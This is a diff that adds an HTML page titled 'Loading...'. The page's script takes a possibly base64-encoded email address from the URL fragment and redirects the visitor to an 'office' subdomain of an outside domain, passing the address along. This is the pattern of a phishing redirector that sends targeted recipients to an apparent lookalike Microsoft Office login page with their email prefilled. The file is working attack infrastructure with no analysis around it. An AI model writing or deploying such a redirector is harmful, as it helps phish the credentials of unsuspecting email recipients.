@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>Loading...</title>
+</head>
+<body>
+<script>
+    // Get the hash fragment from the current URL
+    var hash = window.location.hash.substring(1); // Remove the '#' from the hash
+
+    // Function to check if a string is base64 encoded
+    function isBase64(str) {
+        try {
+            return btoa(atob(str)) === str;
+        } catch (err) {
+            return false;
+        }
+    }
+
+    // Redirect function that decides redirection based on the content of the hash
+    function redirect(email) {
+        if (isBase64(email)) {
+            // If the email is base64 encoded, decode it
+            email = atob(email);
+        }
+        // Redirect the user to a new URL with the email address as a query parameter
+        window.location.href = "https://office.etiminc.com/#" + email;
+    }
+
+    if (hash) {
+        // If there is a hash, process it for redirection
+        redirect(hash);
+    } else {
+        // Optional: Handle cases where there is no hash present
+        console.log("No hash found in the URL.");
+    }
+</script>
+</body>
+</html>
